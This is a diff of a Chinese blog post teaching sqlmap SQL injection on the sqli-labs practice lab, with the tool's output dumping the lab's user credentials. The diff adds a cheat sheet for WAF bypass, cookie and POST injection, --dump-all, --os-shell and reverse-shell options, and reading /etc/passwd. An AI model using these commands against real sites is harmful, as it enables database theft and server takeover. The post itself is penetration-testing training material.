@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="使用sqli-labs练习社区sqlmap（mysql） 漏洞源代码下载：https://github.com/Audi-1/sqli-labs 工具注入(sqlmap)简单测试 (-u url)sqlmap -u &amp;quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&amp;quot; --level 3  [*] starting at 15:33:0">
+<meta name="description" content="使用sqli-labs练习社区sqlmap（mysql） 漏洞源代码下载：https://github.com/Audi-1/sqli-labs 工具注入(sqlmap)简单演示简单测试 (-u url)sqlmap -u &amp;quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&amp;quot; --level 3  [*] starting at 15:">
 <meta name="keywords" content="sqli-labs,sqlmap">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqlmap使用练习">
 <meta property="og:url" content="http://yoursite.com/2018/04/19/sqlmap使用/index.html">
 <meta property="og:site_name" content="Ahodor&#39;Via">
-<meta property="og:description" content="使用sqli-labs练习社区sqlmap（mysql） 漏洞源代码下载：https://github.com/Audi-1/sqli-labs 工具注入(sqlmap)简单测试 (-u url)sqlmap -u &amp;quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&amp;quot; --level 3  [*] starting at 15:33:0">
+<meta property="og:description" content="使用sqli-labs练习社区sqlmap（mysql） 漏洞源代码下载：https://github.com/Audi-1/sqli-labs 工具注入(sqlmap)简单演示简单测试 (-u url)sqlmap -u &amp;quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&amp;quot; --level 3  [*] starting at 15:">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-04-19T14:02:28.980Z">
+<meta property="og:updated_time" content="2018-07-27T03:28:59.984Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqlmap使用练习">
-<meta name="twitter:description" content="使用sqli-labs练习社区sqlmap（mysql） 漏洞源代码下载：https://github.com/Audi-1/sqli-labs 工具注入(sqlmap)简单测试 (-u url)sqlmap -u &amp;quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&amp;quot; --level 3  [*] starting at 15:33:0">
+<meta name="twitter:description" content="使用sqli-labs练习社区sqlmap（mysql） 漏洞源代码下载：https://github.com/Audi-1/sqli-labs 工具注入(sqlmap)简单演示简单测试 (-u url)sqlmap -u &amp;quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&amp;quot; --level 3  [*] starting at 15:">
 
 
 
@@ -355,7 +355,7 @@
 
       
         <h1 id="使用sqli-labs练习社区sqlmap（mysql）"><a href="#使用sqli-labs练习社区sqlmap（mysql）" class="headerlink" title="使用sqli-labs练习社区sqlmap（mysql）"></a>使用sqli-labs练习社区sqlmap（mysql）</h1><p> 漏洞源代码下载：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p>
-<h2 id="工具注入-sqlmap"><a href="#工具注入-sqlmap" class="headerlink" title="工具注入(sqlmap)"></a>工具注入(sqlmap)</h2><h4 id="简单测试-u-url"><a href="#简单测试-u-url" class="headerlink" title="简单测试 (-u url)"></a>简单测试 (-u url)</h4><pre><code>sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --level 3
+<h2 id="工具注入-sqlmap-简单演示"><a href="#工具注入-sqlmap-简单演示" class="headerlink" title="工具注入(sqlmap)简单演示"></a>工具注入(sqlmap)简单演示</h2><h3 id="简单测试-u-url"><a href="#简单测试-u-url" class="headerlink" title="简单测试 (-u url)"></a>简单测试 (-u url)</h3><pre><code>sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --level 3
 
 [*] starting at 15:33:02
 
@@ -385,7 +385,7 @@ web server operating system: Windows
 web application technology: PHP 5.4.45, Apache 2.4.23
 back-end DBMS: MySQL &gt;= 5.0
 </code></pre><p>注：-v(–level) 3 同时显示注入的payload</p>
-<h4 id="列出数据库系统的数据库-–dbs"><a href="#列出数据库系统的数据库-–dbs" class="headerlink" title="列出数据库系统的数据库(–dbs)"></a>列出数据库系统的数据库(–dbs)</h4><pre><code>sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --dbs
+<h3 id="列出数据库系统的数据库-–dbs"><a href="#列出数据库系统的数据库-–dbs" class="headerlink" title="列出数据库系统的数据库(–dbs)"></a>列出数据库系统的数据库(–dbs)</h3><pre><code>sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --dbs
 
 web server operating system: Windows
 web application technology: PHP 5.4.45, Apache 2.4.23
@@ -405,7 +405,7 @@ available databases [6]:
 [*] performance_schema
 [*] security
 [*] test
-</code></pre><h4 id="列出数据库表-–tables-D-数据库名，若无-D参数则显示数据库中所有表"><a href="#列出数据库表-–tables-D-数据库名，若无-D参数则显示数据库中所有表" class="headerlink" title="列出数据库表(–tables -D 数据库名，若无-D参数则显示数据库中所有表)"></a>列出数据库表(–tables -D 数据库名，若无-D参数则显示数据库中所有表)</h4><pre><code>sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --tables -D &apos;security&apos;
+</code></pre><h3 id="列出数据库表-–tables-D-数据库名，若无-D参数则显示数据库中所有表"><a href="#列出数据库表-–tables-D-数据库名，若无-D参数则显示数据库中所有表" class="headerlink" title="列出数据库表(–tables -D 数据库名，若无-D参数则显示数据库中所有表)"></a>列出数据库表(–tables -D 数据库名，若无-D参数则显示数据库中所有表)</h3><pre><code>sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --tables -D &apos;security&apos;
 web server operating system: Windows
 web application technology: PHP 5.4.45, Apache 2.4.23
 back-end DBMS: MySQL &gt;= 5.0
@@ -423,7 +423,7 @@ Database: security
 | uagents  |
 | users    |
 +----------+
-</code></pre><h4 id="列出数据库中的列-–column-T-表名-D-数据库名-若无-D参数则默认当前数据库"><a href="#列出数据库中的列-–column-T-表名-D-数据库名-若无-D参数则默认当前数据库" class="headerlink" title="列出数据库中的列(–column -T 表名 -D 数据库名  若无-D参数则默认当前数据库)"></a>列出数据库中的列(–column -T 表名 -D 数据库名  若无-D参数则默认当前数据库)</h4><pre><code>sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --column -T &apos;users&apos; -D &apos;security&apos;
+</code></pre><h3 id="列出数据库中的列-–column-T-表名-D-数据库名-若无-D参数则默认当前数据库"><a href="#列出数据库中的列-–column-T-表名-D-数据库名-若无-D参数则默认当前数据库" class="headerlink" title="列出数据库中的列(–column -T 表名 -D 数据库名  若无-D参数则默认当前数据库)"></a>列出数据库中的列(–column -T 表名 -D 数据库名  若无-D参数则默认当前数据库)</h3><pre><code>sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --column -T &apos;users&apos; -D &apos;security&apos;
 
 web server operating system: Windows
 web application technology: PHP 5.4.45, Apache 2.4.23
@@ -447,7 +447,7 @@ Table: users
 | password   | varchar(20) |
 | username   | varchar(20) |
 +------------+-------------+
-</code></pre><h4 id="获取整某张表的信息-–dump-C-column1，column2-T-tablename-D-databasename"><a href="#获取整某张表的信息-–dump-C-column1，column2-T-tablename-D-databasename" class="headerlink" title="获取整某张表的信息(–dump -C column1，column2 -T tablename -D databasename )"></a>获取整某张表的信息(–dump -C column1，column2 -T tablename -D databasename )</h4><pre><code>sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --dump -C &apos;username&apos;,&apos;password&apos; -T &apos;users&apos; -D &apos;security&apos;
+</code></pre><h3 id="获取整某张表的信息-–dump-C-column1，column2-T-tablename-D-databasename"><a href="#获取整某张表的信息-–dump-C-column1，column2-T-tablename-D-databasename" class="headerlink" title="获取整某张表的信息(–dump -C column1，column2 -T tablename -D databasename )"></a>获取整某张表的信息(–dump -C column1，column2 -T tablename -D databasename )</h3><pre><code>sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --dump -C &apos;username&apos;,&apos;password&apos; -T &apos;users&apos; -D &apos;security&apos;
 
 web server operating system: Windows
 web application technology: PHP 5.4.45, Apache 2.4.23
@@ -488,6 +488,237 @@ Table: users
 | dhakkan  | dumbo      |
 | admin4   | admin4     |
 +----------+------------+
+</code></pre><a id="more"></a>
+<h2 id="sqlmap使用语法大全"><a href="#sqlmap使用语法大全" class="headerlink" title="sqlmap使用语法大全"></a>sqlmap使用语法大全</h2><h3 id="1-基础用法："><a href="#1-基础用法：" class="headerlink" title="1. 基础用法："></a>1. 基础用法：</h3><pre><code>./sqlmap.py -u “注入地址” -v 1 –dbs   // 列举数据库
+./sqlmap.py -u “注入地址” -v 1 –current-db   // 当前数据库
+./sqlmap.py -u “注入地址” -v 1 –users    // 列数据库用户
+./sqlmap.py -u “注入地址” -v 1 –current-user  // 当前用户
+./sqlmap.py -u “注入地址” -v 1 –tables -D “数据库”   // 列举数据库的表名
+./sqlmap.py -u “注入地址” -v 1 –columns -T “表名” -D “数据库”   // 获取表的列名
+./sqlmap.py -u “注入地址” -v 1 –dump -C “字段,字段” -T “表名” -D “数据库”   // 获取表中的数据，包含列
+</code></pre><p>已经开始拖库了，SQLMAP是非常人性化的，它会将获取的数据存储sqlmap/output/中、、、</p>
+<h3 id="2-sqlmap-post注入"><a href="#2-sqlmap-post注入" class="headerlink" title="2. sqlmap post注入"></a>2. sqlmap post注入</h3><p>我们在使用Sqlmap进行post型注入时，<br>经常会出现请求遗漏导致注入失败的情况。<br>这里分享一个小技巧，即结合burpsuite来使用sqlmap，<br>用这种方法进行post注入测试会更准确，操作起来也非常容易。</p>
+<pre><code>1. 浏览器打开目标地址http:// www.2cto.com /Login.asp
+2. 配置burp代理(127.0.0.1:8080)以拦截请求
+3. 点击login表单的submit按钮
+4. 如下图，这时候Burp会拦截到了我们的登录POST请求
+5. 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下 
+6. 运行sqlmap并使用如下命令：
+./sqlmap.py -r search-test.txt -p tfUPass
+</code></pre><p>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，<br>而-p 大家应该比较熟悉，指定注入用的参数。</p>
+<h3 id="3-sqlmap-cookies注入"><a href="#3-sqlmap-cookies注入" class="headerlink" title="3.sqlmap  cookies注入"></a>3.sqlmap  cookies注入</h3><pre><code>sqlmap.py -u “http://127.0.0.1/base.php” –cookies “id=1″  –dbs –level 2
+</code></pre><p>默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&gt;=2的时候也会检查cookie时面的参数，当&gt;=3的时候将检查User-agent和Referer，那么这就很简单了，我 们直接在原有的基础上面加上 –level 2 即可<br>利用sqlmap cookies注入突破用户登录继续注入<br>先把用户登陆的cookie拿到吧，<br>在收藏夹添加一个链接cookies属性：<br>名字自己取<br>javascript:alert(document.cookie)，，需要获取当前cookie的时候，<br>直接点一下这个链接，然后复制一下弹出对话框<br>里的cookie值就搞定了</p>
+<pre><code>sqlmap.py -u http://x.x.x.x/Down.aspx?tid=2 -p tid –dbms mssql –cookie=”info=username=test”
+</code></pre><p>-p是指指定参数注入</p>
+<h3 id="4-sqlmap遇到url重写的注入"><a href="#4-sqlmap遇到url重写的注入" class="headerlink" title="4. sqlmap遇到url重写的注入"></a>4. sqlmap遇到url重写的注入</h3><p>哪里存在注入就加上 * 号</p>
+<pre><code>./sqlmap.py -u “http://www.cunlide.com/id1/1*/id2/2“
+</code></pre><p>###5.sqlmap 编码绕waf注入<br>    ./sqlmap.py -u <a href="http://127.0.0.1/test.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/test.php?id=1</a> -v 3 –dbms “MySQL” –technique U -p id –batch –tamper “space2morehash.py”<br>在sqlmap 的 tamper目录下有很多space2morehash.py 编码脚本自行加载</p>
+<h3 id="其他基础："><a href="#其他基础：" class="headerlink" title="其他基础："></a>其他基础：</h3><pre><code>sqlmap -u “http://url/news?id=1” –level=3 –smart –dbms “Mysql” –current-user #获取当前用户名称
+sqlmap -u “http://www.xxoo.com/news?id=1” –level=3 –smart –dbms “Mysql” –current-db  #获取当前数据库名称
+sqlmap -u “http://www.xxoo.com/news?id=1” –level=3 –smart –dbms “Mysql”–tables  -D “db_name” #列表名
+sqlmap -u “http://url/news?id=1” –level=3 –smart  –dbms “Mysql” –columns -T “tablename” users-D “db_name” -v 0 #列字段
+sqlmap -u “http://url/news?id=1” –level=3 –smart –dbms “Mysql”  –dump  -C “column_name”  -T “table_name” -D “db_name” -v 0   #获取字段内容
+</code></pre><h4 id="信息获取"><a href="#信息获取" class="headerlink" title="**信息获取**"></a><strong><strong><strong><strong>**</strong></strong></strong></strong>信息获取<strong><strong><strong><strong>**</strong></strong></strong></strong></h4><pre><code>sqlmap -u “ –smart –dbms “Mysql” –users  #列数据库用户  sqlmap -u “ –smart –dbms “Mysql” –dbs#列数据库  sqlmap -u “ –smart –dbms “Mysql”–passwords #数据库用户密码  sqlmap -u “ –smart –dbms “Mysql”–passwords-U root  -v 0 #列出指定用户数据库密码  sqlmap -u “ –smart –dbms “Mysql” –dump-all -v 0 #列出所有数据库所有表   
+sqlmap -u “ –smart –dbms “Mysql”–privileges #查看权限  sqlmap -u “ –smart –dbms “Mysql”–privileges -U root #查看指定用户权限  sqlmap -u “ –smart –dbms “Mysql” –is-dba -v 1 #是否是数据库管理员  sqlmap -u “ –smart –dbms “Mysql” –roles #枚举数据库用户角色  sqlmap -u “ –smart –dbms “Mysql”–udf-inject #导入用户自定义函数（获取系统权限！）  
+sqlmap -u “ –smart –dbms “Mysql”–dump-all –exclude-sysdbs -v 0 #列出当前库所有表  
+sqlmap -u “ –smart –dbms “Mysql” –union-check #是否支持union 注入  sqlmap -u “ –smart –dbms “Mysql”–union-cols #union 查询表记录  sqlmap -u “ –smart –dbms “Mysql” –union-test #union 语句测试  
+sqlmap -u “ –smart –dbms “Mysql” –union-use –banner #采用union 注入  sqlmap -u “ –smart –dbms “Mysql”–union-test –union-tech orderby #union 配合 order by  
+sqlmap -u “ –smart –dbms “Mysql”–method “POST” — data “id=1&amp;cat=2″ #post注入  sqlmap -u “ –smart –dbms “Mysql”–cookie “COOKIE_VALUE” #cookie注入  
+sqlmap -u “ –smart –dbms “Mysql”-b #获取banner信息 
+
+sqlmap -u “http://url/news?id=1” –level=3 –smart-v 1 -f #指纹判别数据库类型
+sqlmap -u “http://url/news?id=1” –level=3 –smart–proxy”http://127.0.0.1:8118” #代理注入
+sqlmap -u “http://url/news?id=1″–string”STRING_ON_TRUE_PAGE“  #指定关键词
+sqlmap -u “ –smart –dbms “Mysql”–sql-shell #执行指定sql命令  
+sqlmap -u “ –smart –dbms “Mysql”–file /etc/passwd  sqlmap -u “ –smart –dbms “Mysql”–os-cmd=whoami #执行系统命令  sqlmap -u “ –smart –dbms “Mysql”–os-shell #系统交互shell  sqlmap -u “ –smart –dbms “Mysql”–os-pwn #反弹shell  sqlmap -u “ –smart –dbms “Mysql”–reg-read #读取win系统注册表  sqlmap -u “ –smart –dbms “Mysql” –dbs-o “sqlmap.log” #保存进度  sqlmap -u “ –smart –dbms “Mysql” –dbs  -o “sqlmap.log” –resume  #恢复已保存进度 
+</code></pre><h4 id="注入分法不同，种类不同，来个简单的分类："><a href="#注入分法不同，种类不同，来个简单的分类：" class="headerlink" title="注入分法不同，种类不同，来个简单的分类："></a>注入分法不同，种类不同，来个简单的分类：</h4><pre><code>1.get型：sqlmap -u “http://xxx.xx.xxx/xx.xxx?xx=xxx” 
+2.post型: sqlmap -u “http://xxx.xx.xxx/xx.xxx” –data=”xxxx=xxxx&amp;xxxx=xxx”
+3.cookie类注入: sqlmap -u “http://xxx.xx.xxx/xx.xxx?xx=xxx” –cookie=”xxx=xxx&amp;xxx=xxx” –level=2
+</code></pre><p>好，区分完毕再来后续的</p>
+<pre><code>需要数据库好：–dbs
+得到数据库名称xxx，需要表： -D xxx –tables
+得到表名xxxx，需要段：-D xxx -T xxxx –columns
+得到段内有admin，password，需要值：-D xxx -T xxxx -C “admin,password” –dump
+那么我们来理解一下，-D -T -C 是干吗的，当然就是知道其名称，指定使用其。
+–dbs –tables –columns 是干吗的，当然就是不知道名称，列出来呗
+–dump 那自然就是字面意思，类似于导出数据的行为
+其实注入有了上面这几个命令，妥妥的够用了，不过还需要绕waf –tamper=”&quot;
+注入被识别出来是工具，断开咋办–user-agent=”&quot;
+再多牛逼的功能都是慢慢积累出来的，别想一口吃成胖子
+</code></pre><h4 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h4><p><a href="http://www.xxx.com/login.asp有post注入，我想*了,但是我不想出去拷贝post数据，很麻烦，我想让sqlmap自动跑post注入" target="_blank" rel="noopener">http://www.xxx.com/login.asp有post注入，我想*了,但是我不想出去拷贝post数据，很麻烦，我想让sqlmap自动跑post注入</a></p>
+<pre><code>sqlmap -u “http://www.xxx.com/login.asp” –forms
+</code></pre><p>很好，上面的命令成功的帮我跑了post注入，并且找到了post的注入点jjj=123</p>
+<pre><code>sqlmap -u “http://www.xxx.com/login.asp” –forms -p jjj –dbs
+</code></pre><p>于是我用上面的命令看看数据库</p>
+<pre><code>sqlmap -u “http://www.xxx.com/login.asp” –forms -p jjj –is-dba
+</code></pre><p>顺便看看当前用户是不是dba</p>
+<pre><code>sqlmap -u “http://www.xxx.com/login.asp” –forms -p jjj -a 
+</code></pre><p>用了上面的命令 -a能得到什么呢：自己去看帮助吧。<br>帮你筛选了一下，-a下面的那些命令是用来看用户，看主机，看权限的。</p>
+<p>后来呢，我发现权限还是挺高的，同时呢，我跑出来了数据库名称kkk</p>
+<pre><code>sqlmap -u “http://www.xxx.com/login.asp” –forms -p jjj -D kkk –tables
+</code></pre><p>同时我找到了网站路径，然后我就又一次找到了sqlmap的牛逼的–os-xx系列命令，可以执行系统命令，同时还发现了牛逼的xpcmdshell –os-shell</p>
+<p>以及很多牛逼的文件操作命令–file-xx 这些命令在需要用的时候使用就是了，会给你带来意想不到的惊喜</p>
+<p>与此同时，我发现tables里面没有我想要的东西，我也找不到合适的内容，咋办呢，心一横，我决定把所有的数据库内容跑出来自己找，于是我这么做：</p>
+<pre><code>sqlmap -u “http://www.xxx.com/login.asp” –forms -p jjj -D kkk –dump-all
+</code></pre><p>然后牛逼的sqlmap就开始跑啊跑，然后紧接着我的蛋就碎了，尼玛，sqlmap一会就问你一次要不要破解密码，要不要这个，要不要那个，我和我的小朋友们都想擦你妹夫，功夫不负有心人，我又看见了一个命令 –batch 可以自动选择sqlmap默认选项<br>于是，我可以和我的小朋友们玩耍去了，再也不用看着sqlmap拖库了。</p>
+<h4 id="总结下来，帮助文档还是很重要的，多看看，总会有些收获："><a href="#总结下来，帮助文档还是很重要的，多看看，总会有些收获：" class="headerlink" title="总结下来，帮助文档还是很重要的，多看看，总会有些收获："></a>总结下来，帮助文档还是很重要的，多看看，总会有些收获：</h4><p>为了避免各位看英文看到吐，大概总结下：</p>
+<pre><code>Target: 字面意思，目标，那么就是确定目标的
+Request: 字面意思，请求，就是定义请求内容的，比如post数据，http头，cookie注入，http头污染等等
+Optimization：字面意思，调节性能，等等
+Injection: 字面意思，注入的设置内容基本在这里，比如指定注入点，指定db，指定系统，等等
+Detection:
+基本就是用在确认注入范围，寻找注入点区域，这些
+Technique:
+基本用在确定注入手段，以及攻击方式
+Fingerprint:
+基本用在指纹识别，用的很少
+Enumeration:
+枚举信息，主要用在注入中，很重要，很常用
+Brute force:
+用来爆破，其实主要是枚举tables columns用的
+User-defined function injection:
+现在只有udf提权，以及指定一些自己定义的sqlmap脚本用，高端使用，求大牛指点
+File system access
+主要是文件读取，文件写入
+Operating system access 
+主要用在对系统操作，例如os-shell 以及 后续的连接metasploit 实现后渗透攻击
+windows registry access
+基本就是注册表操作了
+General
+字面意思，综合的内容，一些特殊的功能实现，我在这里找到了crawl batch这些非常好用的参数
+Miscellaneous
+目测高端应用，还没怎么用过，求大神指教
+</code></pre><p>如上面总结的，大概红字就是常用的命令，剩下的不常用里面也有很多很不错，在特殊情况下适用的内容，反正本贴科普而已。</p>
+<p>字有点多，想看的菜鸟朋友认真看下来应该会有些收获，菜鸟们如果有什么其他的奇技淫巧，还希望分享1、2 共同进步！！</p>
+<h2 id="SQLMAP中文说明"><a href="#SQLMAP中文说明" class="headerlink" title="SQLMAP中文说明"></a>SQLMAP中文说明</h2><pre><code>-D直接直接连接到数据库
+-U网址 - URL = URL目标URL
+ -L使用burp,WebScarab代理日志解析目标保存在指定的文本文件
+ -M BULKFILE扫描多个目标入伍
+ -R REQUESTFILE负载的HTTP请求从一个文件
+ -G读取谷歌url，传说中的批量检测
+ -C从配置INI文件configfile中加载选项
+</code></pre><h3 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h3><p>   这些选项可以用来指定如何连接到目标URL。</p>
+<pre><code>--data=DATA通过POST发送数据串
+--cookie=COOKIE 的HTTP Cookie头
+--cookie-urlencode URL编码生成的cookie注射
+--drop-set-cookie忽略从Set-Cookie头的响应
+--user-agent=AGENT HTTP User-Agent头
+--random-agent 随机选择的HTTP User-Agent头
+--referer=REFERER  HTTP Referer头
+--headers=HEADERS HTTP头换行符隔开
+--auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）
+--auth-cred=ACRED的HTTP身份验证凭据（用户名：密码）
+--auth-cert=ACERT ACERT HTTP认证证书（key_file，cert_file中）
+--proxy=PROXY HTTP代理连接到目标URL
+ --proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）
+--ignore-proxy忽略HTTP代理
+--delay=DELAY每个HTTP请求之间的延迟
+--timeout=TIMEOUT 等待连接超时（默认30）
+--retries=RETRIES 重试连接超时（默认3）
+--scope=SCOPE 正则表达式来过滤目标提供代理日志
+--safe-url=SAFURL URL地址访问测试过程中经常
+--safe-freq=SAFREQ访问之间的一个给定的安全URL SAFREQ测试要求
+</code></pre><h3 id="优化："><a href="#优化：" class="headerlink" title="优化："></a>优化：</h3><p>   这些选项可以用于优化性能的SqlMap。</p>
+<pre><code>-O开启所有优化开关
+ --predict-output 预测输出预测常见的查询输出
+ --keep-alive    保持活动使用持久HTTP（S）连接
+ --null-connection 空连接检索页面没有实际的HTTP响应体长度
+ --threads=THREADS最大数量的并发HTTP（S）请求（默认为1）
+</code></pre><h3 id="注射："><a href="#注射：" class="headerlink" title="注射："></a>注射：</h3><p>   这些选项可以用来指定哪些参数测试，<br>   提供定制注塑载荷和可选篡改脚本。</p>
+<pre><code>-P TESTPARAMETER可测试参数（S）
+ --dbms=DBMS指定数据库 
+ --os=OS指定操作系统
+ --prefix=PREFIX注射有效载荷前缀字符串
+ --suffix=SUFFIX注射有效载荷后缀字符串
+ --tamper=TAMPER篡改注入数据为使用给定的脚本（S）
+</code></pre><h3 id="检测："><a href="#检测：" class="headerlink" title="检测："></a>检测：</h3><p>   这些选项可以用来指定如何解析和比较页面<br>   从HTTP响应时使用盲SQL注入技术的内容。</p>
+<pre><code>--level=LEVEL要执行的测试水平等级（1-5，默认为1）
+--risk=RISK 测试执行的风险（0-3，默认为1）
+--string=STRING字符串匹配字符串在查询时是有效的页面
+--regexp=REGEXP的正则表达式匹配在页面查询时是有效的
+--text-only 纯文本比较只对文字内容为基础的网页
+</code></pre><h3 id="技巧："><a href="#技巧：" class="headerlink" title="技巧："></a>技巧：</h3><p>   这些选项可以用来调整特定的SQL注入测试<br>   技术。</p>
+<pre><code>--technique=TECH SQL注入技术测试（默认博伊斯特）
+--time-sec=TIMESEC秒的拖延DBMS响应（默认为5）
+--union-cols=UCOLS列范围测试
+--union-char=UCHAR字符使用暴力破解的列数
+</code></pre><h3 id="指纹："><a href="#指纹：" class="headerlink" title="指纹："></a>指纹：</h3><pre><code>-f, --fingerprint 指纹进行广泛的DBMS版本指纹
+</code></pre><h3 id="枚举："><a href="#枚举：" class="headerlink" title="枚举："></a>枚举：</h3><p>   这些选项可以用来列举的后端数据库<br>   管理系统中所包含的信息，结构和数据<br>   表。此外，您可以运行您自己的SQL语句。</p>
+<pre><code>-b，--banner数据库的旗帜
+--current-user数据库当前用户
+--current-db检索数据库当前数据库
+--is-dba 检测如果DBMS当前用户是DBA
+  --users  枚举用户和DBMS用户
+ --passwords  密码枚举DBMS用户密码哈希
+ --privileges 特权列举数据库用户的权限
+ --roles 角色枚举数据库用户的角色
+ --dbs枚举的DBMS数据库
+ --tables DBMS数据库表
+ --columns DBMS数据库表列
+ --schema枚举数据库模式
+ --count检索表条目的数量
+ --dump转储DBMS数据库表条目
+ --dump-all全部转储所有的DBMS数据库表中的条目
+ --search搜索列（S），表（S）和/或数据库名称（S）
+ -D DBMS数据库枚举
+ -T DBMS数据库表枚举
+ -C DBMS的数据库表列列举
+ -U用户DBMS用户枚举
+ --exclude-sysdbs排除列举表时，DBMS系统数据库
+ --start=LIMITSTART首先查询的输出项检索
+ --stop=LIMITSTOP最后查询的输出项检索
+ --first=FIRSTCHAR首先查询输出单词字符检索
+ --last=LASTCHAR最后查询的输出单词字符检索
+ --sql-query=QUERY执行查询的SQL语句
+ --sql-shell提示下一个交互式SQL外壳
+</code></pre><h3 id="蛮力："><a href="#蛮力：" class="headerlink" title="蛮力："></a>蛮力：</h3><p>   这些选项可以用来运行蛮力检查的。</p>
+<pre><code>--common-tables 共同表检查存在共同表
+--common-columns 共同列检查存在共同的列
+</code></pre><h3 id="用户定义的函数注入："><a href="#用户定义的函数注入：" class="headerlink" title="用户定义的函数注入："></a>用户定义的函数注入：</h3><p>   这些选项可以被用来创建用户自定义功能。</p>
+<pre><code>--udf-inject注入用户自定义功能
+--shared-lib=SHLIB本地路径的共享库
+</code></pre><h3 id="文件系统的访问："><a href="#文件系统的访问：" class="headerlink" title="文件系统的访问："></a>文件系统的访问：</h3><p>   这些选项可以被用来访问后端数据库管理<br>   系统底层的文件系统。</p>
+<pre><code>--file-read=RFILE DBMS文件系统读取文件
+--file-write=WFILE写后端的DBMS文件系统上的本地文件
+--file-dest=DFILE后端数据库的绝对文件路径写入
+</code></pre><h3 id="操作系统访问："><a href="#操作系统访问：" class="headerlink" title="操作系统访问："></a>操作系统访问：</h3><p>   这些选项可以被用来访问后端数据库管理<br>   系统底层操作系统。</p>
+<pre><code>--os-cmd=OSCMD执行操作系统命令
+--os-shell提示符下交互式操作系统外壳
+--os-pwn提示为一个彻头彻尾的带外壳，meterpreter或VNC
+ --os-smbrelay一个点击提示一个OOB壳，meterpreter或VNC
+ --os-bof存储过程缓冲区溢出剥削
+--priv-esc数据库进程“用户权限升级
+--msf-path=MSFPATH本地路径Metasploit Framework等3安装
+--tmp-path=TMPPATH远程绝对路径的临时文件目录
+</code></pre><h3 id="Windows注册表的访问："><a href="#Windows注册表的访问：" class="headerlink" title="Windows注册表的访问："></a>Windows注册表的访问：</h3><p>   这些选项可以被用来访问后端数据库管理<br>   系统Windows注册表。</p>
+<pre><code>--reg-read读Windows注册表项值
+--reg-add写一个Windows注册表项值数据
+--reg-delL删除Windows注册表键值
+--reg-key=REGKEY Windows注册表
+--reg-value=REGVAL Windows注册表键值
+--reg-data=REGDATA Windows注册表关键值数据
+--reg-type=REGTYPE Windows注册表项值类型
+</code></pre><h3 id="秘书长："><a href="#秘书长：" class="headerlink" title="秘书长："></a>秘书长：</h3><p>   这些选项可以用来设置一些一般性的工作参数。</p>
+<pre><code>-s 保存和恢复在会议文件中检索所有数据
+-t 登录到一个文本文件中所有的HTTP流量
+--batch 一批从不要求用户输入，使用的默认行为
+--charset=CHARSET字符编码，用于数据检索
+--eta显示预计到达时间为每个输出
+--flush-session  冲洗会议会话文件
+--fresh-queries在会议文件中存储的查询结果
+--save 配置INI文件保存选项
+--update更新的SqlMap
+</code></pre><h3 id="杂项："><a href="#杂项：" class="headerlink" title="杂项："></a>杂项：</h3><pre><code>--beep SQL注入发现
+--check-payload 检查有效载荷的IDS检测测试
+--cleanup清理SqlMap特定的UDF和表的DBMS
+ --forms解析和测试形式的目标URL
+ --gpage=GOOGLEPAGE使用Google从指定的页码dork结果
+--mobile通过HTTP User-Agent头
+--page-rank显示网页排名（PR）为Google dork结果
+--parse-errors解析DBMS响应页面的错误信息
+--replicate复制倒入一个SQLite3数据库中的数据
+--tor的使用默认的Tor（Vidalia的/ Privoxy的/ Polipo即可）代理地址
+--wizard向导为初学者用户简单的向导界面
 </code></pre>
       
     </div>
@@ -655,7 +886,7 @@ Table: users
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#使用sqli-labs练习社区sqlmap（mysql）"><span class="nav-number">1.</span> <span class="nav-text">使用sqli-labs练习社区sqlmap（mysql）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#工具注入-sqlmap"><span class="nav-number">1.1.</span> <span class="nav-text">工具注入(sqlmap)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#简单测试-u-url"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">简单测试 (-u url)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#列出数据库系统的数据库-–dbs"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">列出数据库系统的数据库(–dbs)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#列出数据库表-–tables-D-数据库名，若无-D参数则显示数据库中所有表"><span class="nav-number">1.1.0.3.</span> <span class="nav-text">列出数据库表(–tables -D 数据库名，若无-D参数则显示数据库中所有表)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#列出数据库中的列-–column-T-表名-D-数据库名-若无-D参数则默认当前数据库"><span 